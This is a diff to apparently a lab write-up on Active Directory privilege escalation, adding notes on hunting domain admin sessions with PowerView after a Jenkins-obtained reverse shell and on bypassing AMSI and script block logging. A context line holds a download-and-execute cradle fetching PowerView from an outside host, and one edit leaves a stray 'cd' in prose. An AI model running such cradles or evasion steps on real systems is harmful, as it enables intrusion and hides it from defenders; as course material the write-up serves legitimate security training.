@@ -1,5 +1,11 @@
 # 🪜 Domain admin session in target domain -> escalate privileges
 
+We have access to two domain users - student613 and ciadmin and administrative access to dcorp-adminsrv machine. User hunting has not been fruitful as studentx. We got a reverse shell on dcorp-ci as ciadmin by abusing Jenkins.
+
+We can use Powerview's Find-DomainUserLocation on the reverse shell to looks for machines where a domain admin is logged in. First, we must bypass AMSI and enhanced logging.
+
+First bypass Enhanced Script Block Logging so that the AMSI bypass is not logged. We could also use these bypasses in the initial download-execute cradle that we used in Jenkins.
+
 We are going to start by using **Find-DomainUserLocation** on the reverse shell we got earlier as ciadmin to looks for machines where a domain admin is logged in.
 
 {% embed url="https://powersploit.readthedocs.io/en/latest/Recon/Find-DomainUserLocation/" %}
@@ -31,6 +37,15 @@ iex ((New-Object Net.WebClient).DownloadString('http://172.16.100.13:6565/PowerV
 ```
 Find-DomainUserLocation
 ```
+
+The command `Find-DomainUserLocation` from the PowerSploit framework is used to find the location (computer) where a specific user is currently logged in within a domain.
+
+* **UserDomain**: `dcorp`
+  * The domain in which the user account resides. In this case, the user `svcadmin` belongs to the `dcorp` domain.
+* **UserName**: `svcadmin`
+  * The username of the account for which the current location is being identified. Here, `svcadmin` is likely a service account.
+* **ComputerName**: `dcorp-mgmt.dollarcorp.moneycorp.local`
+  * The fully qualified domain name (FQDN) of the computer where the user is currently logged in. In this example, `svcadmin` is logged into the computer named `dcorp-mgmt.dollarcorp.moneycorp.local`.
 
 We can see that there is a domain admin session on dcorp-mgmt server!
 
@@ -143,7 +158,7 @@ reg query HKLM\Software\Policies\Microsoft\Windows\SRPV2\Script\06dce67b-934c-45
 
 So everyone can run scripts from the C:\ProgramFiles folder
 
-We could've checked that with the following command:
+cd We could've checked that with the following command:
 
 ```
 $ExecutionContext.SessionState.LanguageMode
